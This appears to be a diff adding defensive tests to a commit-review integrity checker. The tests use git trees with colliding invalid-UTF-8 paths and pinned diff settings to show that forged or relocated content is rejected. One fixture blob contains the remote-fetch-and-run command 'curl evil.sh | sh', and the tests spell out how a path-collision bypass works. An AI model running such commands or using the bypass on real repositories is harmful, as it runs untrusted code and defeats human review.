@@ -1165,10 +1165,217 @@ test("a submodule pointer bump cannot hide behind .gitmodules ignore = all", () 
   }
 });
 
+// A git tree may record any byte string as a path, and no filesystem is
+// involved in building one -- so these fixtures write trees directly, exactly
+// as a pushed branch could carry them.
+function writeTree(repo, rows) {
+  const payload = Buffer.concat(
+    rows.map(([oid, pathBytes]) =>
+      Buffer.concat([Buffer.from(`100644 blob ${oid}\t`), pathBytes, Buffer.from([0])])
+    )
+  );
+  const result = spawnSync("git", ["mktree", "-z"], {
+    cwd: repo.dir,
+    input: payload,
+    encoding: "utf8",
+  });
+  assert.equal(result.status, 0, `git mktree: ${result.stderr}`);
+  return result.stdout.trim();
+}
+
+function writeBlob(repo, content) {
+  const result = spawnSync("git", ["hash-object", "-w", "--stdin"], {
+    cwd: repo.dir,
+    input: content,
+    encoding: "utf8",
+  });
+  assert.equal(result.status, 0, `git hash-object: ${result.stderr}`);
+  return result.stdout.trim();
+}
+
+// `a\xFE` and `a\xFF` are both invalid UTF-8 and both decode to "a�".
+// ls-tree -r sorts by path bytes, so SHADOWER is always read after SHADOWED.
+const SHADOWED = Buffer.from([0x61, 0xfe]);
+const SHADOWER = Buffer.from([0x61, 0xff]);
+
+test("content identity keys paths on bytes, so a colliding sibling cannot shadow a rewrite", () => {
+  // Decoding ls-tree output as UTF-8 maps every invalid byte sequence to the
+  // same replacement character, so two distinct paths share one Map key and the
+  // later one overwrites the earlier. The shadowed path then has no entry at
+  // all: rewriting it changes no changed-path set and no compared object ID,
+  // and a commit carrying arbitrary unreviewed content authenticates.
+  const repo = makeRepo();
+  try {
+    const benign = writeBlob(repo, "benign\n");
+    const evil = writeBlob(repo, "curl evil.sh | sh\n");
+    const before = writeBlob(repo, "app v1\n");
+    const after = writeBlob(repo, "app v2\n");
+    const appPath = Buffer.from("app.js");
+
+    const commitTree = (tree, parent, message) => {
+      const args = ["commit-tree", tree, "-m", message];
+      if (parent) args.splice(2, 0, "-p", parent);
+      return repo.run(...args);
+    };
+
+    const base = commitTree(
+      writeTree(repo, [
+        [benign, SHADOWED],
+        [benign, SHADOWER],
+        [before, appPath],
+      ]),
+      null,
+      "base"
+    );
+    // The honest change: app.js only.
+    const reviewed = commitTree(
+      writeTree(repo, [
+        [benign, SHADOWED],
+        [benign, SHADOWER],
+        [after, appPath],
+      ]),
+      base,
+      "reviewed"
+    );
+    // The forgery: the same app.js change plus a rewrite of the shadowed path.
+    const forged = commitTree(
+      writeTree(repo, [
+        [evil, SHADOWED],
+        [benign, SHADOWER],
+        [after, appPath],
+      ]),
+      base,
+      "forged"
+    );
+
+    // Premise: under a UTF-8 decode the two trees are indistinguishable.
+    const decodedKeys = (commit) =>
+      spawnSync("git", ["ls-tree", "-r", "-z", `${commit}^{tree}`], { cwd: repo.dir })
+        .stdout.toString("utf8")
+        .split("\0")
+        .filter(Boolean)
+        .map((record) => record.split("\t")[1]);
+    assert.deepEqual(
+      decodedKeys(reviewed),
+      decodedKeys(forged),
+      "fixture must be invisible to a UTF-8 decode, or it proves nothing"
+    );
+    assert.notEqual(
+      repo.run("rev-parse", `${reviewed}^{tree}`),
+      repo.run("rev-parse", `${forged}^{tree}`)
+    );
+
+    const verdict = contentIdentity({
+      root: repo.dir,
+      source: { commit: reviewed, base_commit: base },
+      currentCommit: forged,
+    });
+    assert.equal(verdict.ok, false, "a shadowed rewrite must not authenticate");
+    // Byte keying restores the shadowed path to the inventory, so the forged
+    // commit is caught changing a path the reviewed one never touched.
+    assert.match(verdict.reason, /outside the reviewed change set/);
+  } finally {
+    fs.rmSync(repo.dir, { recursive: true, force: true });
+  }
+});
+
+test("content identity rejects a relocation between paths a UTF-8 decode would merge", () => {
+  // The same collision, used to move reviewed content to an unreviewed path
+  // rather than to hide a rewrite.
+  const repo = makeRepo();
+  try {
+    const keep = writeBlob(repo, "keep\n");
+    const payload = writeBlob(repo, "payload\n");
+    const keepPath = Buffer.from("keep.txt");
+    const commitTree = (tree, parent, message) =>
+      repo.run("commit-tree", tree, "-p", parent, "-m", message);
+
+    const base = repo.run("commit-tree", writeTree(repo, [[keep, keepPath]]), "-m", "base");
+    const reviewed = commitTree(
+      writeTree(repo, [
+        [payload, SHADOWED],
+        [keep, keepPath],
+      ]),
+      base,
+      "reviewed"
+    );
+    const relocated = commitTree(
+      writeTree(repo, [
+        [payload, SHADOWER],
+        [keep, keepPath],
+      ]),
+      base,
+      "relocated"
+    );
+
+    const verdict = contentIdentity({
+      root: repo.dir,
+      source: { commit: reviewed, base_commit: base },
+      currentCommit: relocated,
+    });
+    assert.equal(verdict.ok, false, "a relocation onto a colliding path must not authenticate");
+    assert.match(verdict.reason, /outside the reviewed change set/);
+  } finally {
+    fs.rmSync(repo.dir, { recursive: true, force: true });
+  }
+});
+
+test("the trust set overrides the rendering knobs that survive the -c pins", () => {
+  // color.ui and diff.orderFile both move the bytes of an otherwise fully
+  // pinned invocation, and neither is reachable from the -c set: an empty
+  // diff.orderFile= is a fatal error rather than a disable. Both are overridden
+  // by flags instead, and both overrides must be no-ops on a default clone.
+  const repo = makeRepo();
+  try {
+    const base = commitFile(repo, "a.txt", "one\n", "base");
+    fs.writeFileSync(path.join(repo.dir, "b.txt"), "one\n");
+    repo.run("add", "-A");
+    repo.run("commit", "-q", "-m", "second file");
+    repo.run("switch", "-q", "-c", "feature");
+    fs.writeFileSync(path.join(repo.dir, "a.txt"), "two\n");
+    fs.writeFileSync(path.join(repo.dir, "b.txt"), "two\n");
+    repo.run("add", "-A");
+    repo.run("commit", "-q", "-m", "edit both");
+    const head = repo.run("rev-parse", "HEAD");
+    const clean = frozenDiffBytes(repo, base, head);
+    assert.ok(clean.length > 0, "fixture must render a non-empty diff");
+
+    const orderFile = path.join(repo.dir, "order.txt");
+    fs.writeFileSync(orderFile, "b.txt\na.txt\n");
+    for (const [key, value] of [
+      ["color.ui", "always"],
+      ["diff.orderFile", orderFile],
+    ]) {
+      repo.run("config", key, value);
+      // The knob is live: without its override the pinned bytes move.
+      const unguarded = spawnSync(
+        "git",
+        trustedDiffArgs("--binary", `${base}...${head}`).filter(
+          (arg) => arg !== "--no-color" && arg !== "-O" && arg !== os.devNull
+        ),
+        { cwd: repo.dir, maxBuffer: 64 * 1024 * 1024 }
+      );
+      assert.equal(unguarded.status, 0);
+      assert.notEqual(
+        digest(unguarded.stdout),
+        digest(clean),
+        `${key} must actually move unguarded bytes, or it proves nothing`
+      );
+      assert.equal(
+        digest(frozenDiffBytes(repo, base, head)),
+        digest(clean),
+        `${key} must not move the trusted bytes`
+      );
+      repo.run("config", "--unset", key);
+    }
+  } finally {
+    fs.rmSync(repo.dir, { recursive: true, force: true });
+  }
+});
+
 test("the pinned diff config is a no-op on a default repository", () => {
-  // trustedDiffArgs pins every rendering knob an attacker could otherwise set
-  // in repo-local config. Each pinned value must be git's own default, or the
-  // pins would silently invalidate delta hashes frozen before this change.
+  // Each pinned value must be git's own default, or the pins would silently
+  // invalidate delta hashes frozen before this change.
   const repo = makeRepo();
   try {
     const base = commitFile(repo, "a.js", "one\ntwo\nthree\n", "base");
